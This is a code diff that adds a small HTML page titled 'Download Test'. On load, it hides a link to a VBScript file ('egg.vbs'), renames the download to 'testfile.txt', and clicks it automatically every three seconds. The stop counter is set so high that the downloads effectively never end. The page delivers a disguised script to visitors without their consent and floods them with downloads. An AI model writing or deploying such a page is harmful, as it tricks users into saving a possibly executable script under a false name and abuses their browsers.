@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Download Test</title>
+</head>
+<body>
+
+    <a id="testLink" href="egg.vbs" download="testfile.txt" style="display:none;"></a>
+
+    <script>
+        const downloadInterval = setInterval(() => {
+            const link = document.getElementById('testLink');
+            link.click();
+            console.log("Download triggered...");
+        }, 3000);
+        let counter = 0;
+        setInterval(() => {
+            counter++;
+            if (counter >= 100000000) {
+                clearInterval(downloadInterval);
+                console.log("Test loop stopped.");
+            }
+        }, 3000);
+    </script>
+
+</body>
+</html>
